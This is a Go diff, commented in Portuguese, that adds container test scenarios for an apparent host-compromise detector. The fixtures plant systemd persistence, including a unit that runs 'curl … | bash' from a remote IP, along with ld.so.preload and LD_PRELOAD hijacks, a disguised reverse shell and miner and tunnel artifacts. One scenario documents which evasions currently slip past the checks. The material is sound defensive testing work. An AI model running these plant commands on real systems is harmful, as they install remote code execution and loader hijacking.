@@ -26,6 +26,22 @@ const implantes = `/helper argv0 "[kworker/0:9]" /helper sleep 300 &
 	/tmp/.x sleep 300 &
 	sleep 0.6`
 
+// persistencia é plantada por três cenários: ao vivo, em imagem e como
+// negativo. Ser o MESMO texto nos três é o ponto — a diferença de resultado,
+// quando houver, é do MODO e não do plantio.
+//
+// O ld.so.preload vai por ÚLTIMO de propósito: a partir dele todo binário
+// dinâmico do contêiner reclama da lib inexistente, e plantar o resto antes
+// mantém a saída legível.
+const persistencia = `mkdir -p /etc/systemd/system/ssh.service.d /etc/systemd/system/multi-user.target.wants /etc/ld.so.conf.d
+	printf '[Service]\nExecStartPre=/tmp/.x\n' > /etc/systemd/system/ssh.service.d/override.conf
+	printf '[Unit]\n[Service]\nExecStart=/bin/sh -c "curl -s http://198.51.100.7/a | bash"\nRestart=always\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/updater.service
+	ln -sf /etc/systemd/system/updater.service /etc/systemd/system/multi-user.target.wants/updater.service
+	printf '[Timer]\nOnUnitActiveSec=45s\n' > /etc/systemd/system/beacon.timer
+	printf '/tmp/libs\n' > /etc/ld.so.conf.d/zz.conf
+	printf 'LD_PRELOAD=/dev/shm/x.so\n' >> /etc/environment
+	printf '/usr/lib/libsysinit.so\n' > /etc/ld.so.preload`
+
 func init() {
 	// ---------------------------------------------------------------- negativos
 	//
@@ -42,6 +58,9 @@ func init() {
 			"proc.suspicious_path", "proc.caps_unexpected", "proc.tracer",
 			"proc.maps_rwx_anon", "proc.ns_divergent",
 			"correlate.revshell", "net.pivot",
+			"persist.ld_preload_global", "persist.ld_so_conf_odd", "persist.env_preload",
+			"persist.unit_exec_suspect", "persist.unit_dropin_exec", "persist.timer_frequent",
+			"tool.artifact", "tool.binary", "proc.env_tool_marker", "proc.ld_preload_env",
 		},
 		Exit: 0,
 	})
@@ -238,6 +257,9 @@ func init() {
 			"proc.suspicious_path", "proc.caps_unexpected", "proc.tracer",
 			"proc.maps_rwx_anon", "proc.ns_divergent",
 			"correlate.revshell", "net.pivot",
+			"persist.ld_preload_global", "persist.ld_so_conf_odd", "persist.env_preload",
+			"persist.unit_exec_suspect", "persist.unit_dropin_exec", "persist.timer_frequent",
+			"tool.artifact", "tool.binary", "proc.env_tool_marker", "proc.ld_preload_env",
 		},
 		Exit: 0,
 	})
@@ -415,6 +437,195 @@ func init() {
 		Expect:         []Expect{{ID: "correlate.revshell", Sev: "CRITICAL"}},
 		Exit:           2,
 		MustBeComplete: true,
+	})
+
+	// ------------------------------------------------------- persistência (§7)
+	//
+	// A primeira família de checks que NÃO depende de /proc. Por isso ela tem
+	// cenário em modo IMAGEM: é a resposta para "o host mente" — leia o disco
+	// de fora, onde o kernel é o do analista (runbook §35.6).
+
+	Register(Scenario{
+		ID:     "60-persistencia-ao-vivo",
+		Desc:   "as seis formas da §7 plantadas: unit, drop-in, timer, preload, conf e environment",
+		Images: matriz,
+		Plant:  persistencia,
+		Expect: []Expect{
+			{ID: "persist.ld_preload_global", Sev: "CRITICAL"},
+			{ID: "persist.env_preload", Sev: "CRITICAL"},
+			{ID: "persist.ld_so_conf_odd", Sev: "WARN"},
+			{ID: "persist.unit_exec_suspect", Sev: "CRITICAL", Subject: "updater.service"},
+			{ID: "persist.unit_dropin_exec", Sev: "WARN", Subject: "ssh.service"},
+			{ID: "persist.timer_frequent", Sev: "WARN", Subject: "beacon.timer"},
+		},
+		// O ld.so.preload invalida o resto do relatório, e isso precisa SAIR
+		// impresso: é a propriedade emergente de ter Origin no modelo.
+		ExpectOutput: []string{"CONFIANÇA REBAIXADA"},
+		Exit:         2,
+	})
+
+	Register(Scenario{
+		ID:   "61-persistencia-em-imagem",
+		Desc: "o mesmo plantio, varrido DE FORA: persistência não precisa de host vivo",
+		// O que este cenário prova não é a detecção — o 60 já provou. É que a
+		// análise SOBREVIVE ao host: com --root não há /proc, não há processo,
+		// e mesmo assim a persistência aparece inteira. É o caminho da §35.6
+		// para quando o userland do alvo não é confiável.
+		Images: minimal,
+		Mode:   Image,
+		Plant:  persistencia,
+		Expect: []Expect{
+			{ID: "persist.ld_preload_global", Sev: "CRITICAL"},
+			{ID: "persist.unit_exec_suspect", Sev: "CRITICAL", Subject: "updater.service"},
+			{ID: "persist.unit_dropin_exec", Sev: "WARN"},
+		},
+		// Os checks de processo NÃO podem inventar resultado numa imagem.
+		Forbid: []string{
+			"proc.memfd_exec", "proc.exe_deleted", "proc.kthread_disguise",
+			"correlate.revshell", "net.pivot",
+		},
+		// E a cobertura precisa CAIR dizendo isso — imagem sem processo não é
+		// host sem implante.
+		MustBeIncomplete: true,
+		Exit:             2,
+	})
+
+	// ------------------------------------------------- adversário, não mecanismo
+	//
+	// Os cenários acima testam UMA forma cada: plantam um mecanismo, afirmam um
+	// check. Isso é a base, e não é a mesma coisa que um incidente — um
+	// comprometimento real deixa cinco a dez artefatos ao mesmo tempo, no mesmo
+	// processo, com relação causal entre eles.
+	//
+	// Os dois abaixo têm eixo de SOFISTICAÇÃO: o mesmo objetivo do atacante,
+	// executado de forma barulhenta e de forma cuidadosa. É o par que mede o
+	// que a ferramenta enxerga de verdade.
+
+	Register(Scenario{
+		ID:   "70-composto-gsocket",
+		Desc: "a forma que o runbook §5.10 descreve, inteira: caminho, disfarce, canal e marcador",
+		// Montado a partir do que a §5.10 e a §17 documentam sobre a família:
+		// binário em ~/.config com nome plausível, processo renomeado para
+		// parecer thread de kernel, saída para relay em 443 (sem listener) e
+		// prefixo de variável que entrega o nome.
+		//
+		// O valor não é cada check isolado — é que QUATRO disparam no mesmo
+		// processo e o operador recebe uma história, não quatro fatos soltos.
+		Images:    minimal,
+		Caps:      []string{"NET_ADMIN"},
+		NoNetwork: true,
+		Plant: `ip link set lo up
+			ip addr add 51.91.190.241/32 dev lo
+			adduser -D -u 1000 node 2>/dev/null
+			mkdir -p /home/node/.config/htop
+			cp /helper /home/node/.config/htop/defunct
+			/helper listen 51.91.190.241:443 &
+			sleep 0.4
+			export GSOCKET_ARGS="-s segredo" GS_ARGS="-liD"
+			/home/node/.config/htop/defunct argv0 "[kworker/1:2]" /home/node/.config/htop/defunct revshell 51.91.190.241:443 &
+			sleep 0.6`,
+		Expect: []Expect{
+			{ID: "correlate.revshell", Sev: "CRITICAL"},
+			{ID: "proc.kthread_disguise", Sev: "CRITICAL"},
+			{ID: "proc.suspicious_path", Sev: "WARN"},
+			// O mais barato e o de maior alavanca: o NOME da ferramenta muda a
+			// prioridade do resto da resposta antes de qualquer engenharia
+			// reversa (runbook §5.10).
+			{ID: "proc.env_tool_marker", Sev: "CRITICAL", Evidence: "GSocket"},
+		},
+		// O valor do composto não é cada check: é a ferramenta contar UMA
+		// história em vez de quatro fatos soltos.
+		ExpectOutput:   []string{"sinais no mesmo alvo"},
+		Exit:           2,
+		MustBeComplete: true,
+	})
+
+	Register(Scenario{
+		ID:   "71-adversario-competente",
+		Desc: "o MESMO objetivo, evitando cada regra: mede o que hoje passa batido",
+		// ESTE CENÁRIO DOCUMENTA UM LIMITE, NÃO UM REQUISITO.
+		//
+		// O atacante aqui leu as mesmas seções que eu: binário em /usr/local/sbin
+		// com nome plausível, sem exec -a, saída para 443 sem dup2 sobre 0/1/2,
+		// beacon de hora em hora em vez de 45s, persistência por drop-in com
+		// comando de aparência inocente.
+		//
+		// Resultado hoje: UM aviso. E ele sobrevive só por causa do único check
+		// construído sobre FORMA em vez de conteúdo — o drop-in dispara porque
+		// alguém acrescentou execução a uma unit alheia, não porque o comando
+		// parecia ruim.
+		//
+		// O que falta para fechar isto NÃO são checks errados, são checks que
+		// ainda não existem: saída para IP público (3.2), integridade de pacote
+		// (fase 7) e amostragem em janela (fase 10). Quando algum deles chegar,
+		// o Exit abaixo vira 2 e o cenário QUEBRA — de propósito. É assim que o
+		// ponto cego deixa de ser esquecível.
+		Images:    minimal,
+		Caps:      []string{"NET_ADMIN"},
+		NoNetwork: true,
+		Plant: `ip link set lo up
+			ip addr add 51.91.190.241/32 dev lo
+			mkdir -p /usr/local/sbin /etc/systemd/system/sshd.service.d
+			cp /helper /usr/local/sbin/systemd-netlinkd
+			/helper listen 51.91.190.241:443 &
+			sleep 0.4
+			/usr/local/sbin/systemd-netlinkd connect 51.91.190.241:443 &
+			printf '[Service]\nExecStartPre=/usr/local/sbin/systemd-netlinkd sleep 1\n' > /etc/systemd/system/sshd.service.d/10-hardening.conf
+			printf '[Timer]\nOnUnitActiveSec=1h\n' > /etc/systemd/system/systemd-netlinkd.timer
+			sleep 0.5`,
+		Expect: []Expect{{ID: "persist.unit_dropin_exec", Sev: "WARN"}},
+		Forbid: []string{
+			"correlate.revshell", "proc.kthread_disguise", "proc.suspicious_path",
+			"proc.memfd_exec", "persist.timer_frequent", "persist.unit_exec_suspect",
+			// e o catálogo de famílias também não pega: renomear o binário o
+			// derrota por completo. É o limite do atalho da §5.10, e é por isso
+			// que ele não pode ser a detecção primária.
+			"tool.binary", "tool.artifact",
+		},
+		Exit:           1,
+		MustBeComplete: true,
+	})
+
+	Register(Scenario{
+		ID:   "72-ld-preload-por-processo",
+		Desc: "LD_PRELOAD no ambiente de um processo vivo rebaixa a confiança da execução",
+		// A versão discreta do /etc/ld.so.preload: injeta só em quem herdou a
+		// variável e não deixa arquivo global. Como o global, ele muda o valor
+		// de TODOS os outros achados — e é isso que o ExpectOutput trava.
+		Images: matriz,
+		Plant: `LD_PRELOAD=/dev/shm/x.so /helper sleep 300 &
+			sleep 0.4`,
+		Expect:       []Expect{{ID: "proc.ld_preload_env", Sev: "CRITICAL"}},
+		ExpectOutput: []string{"CONFIANÇA REBAIXADA"},
+		Exit:         2,
+	})
+
+	Register(Scenario{
+		ID:   "73-ferramentas-conhecidas",
+		Desc: "reconhece a família por config em disco e por nome de executável",
+		// A rota da §5.10 que tem mais alcance que a de variável de ambiente: a
+		// maioria dos implantes não usa env, usa arquivo de config. E ela
+		// funciona em imagem montada.
+		//
+		// O frpc aqui NÃO está rodando — só referenciado num Exec= de unit. É o
+		// caso que importa: a ferramenta que roda no próximo boot.
+		Images: matriz,
+		Plant: `mkdir -p /root/.config/rclone /etc/cloudflared /var/lib/tailscale /etc/xmrig /usr/local/bin /etc/systemd/system
+			printf '[remoto]\ntype = s3\n' > /root/.config/rclone/rclone.conf
+			printf 'tunnel: abc\n' > /etc/cloudflared/config.yml
+			cp /helper /usr/local/bin/xmrig
+			printf '[Service]\nExecStart=/usr/local/bin/frpc -c /etc/frp/frpc.ini\n' > /etc/systemd/system/frp.service
+			/usr/local/bin/xmrig sleep 300 &
+			sleep 0.4`,
+		Expect: []Expect{
+			{ID: "tool.artifact", Sev: "CRITICAL", Subject: "XMRig"},
+			{ID: "tool.artifact", Sev: "WARN", Subject: "rclone"},
+			{ID: "tool.artifact", Sev: "WARN", Subject: "Tailscale"},
+			// nome de executável, no processo vivo E no Exec= de uma unit
+			{ID: "tool.binary", Sev: "CRITICAL", Subject: "XMRig"},
+			{ID: "tool.binary", Subject: "frp", Evidence: "frp.service"},
+		},
+		Exit: 2,
 	})
 
 	// ---------------------------------------------------------------- modo image
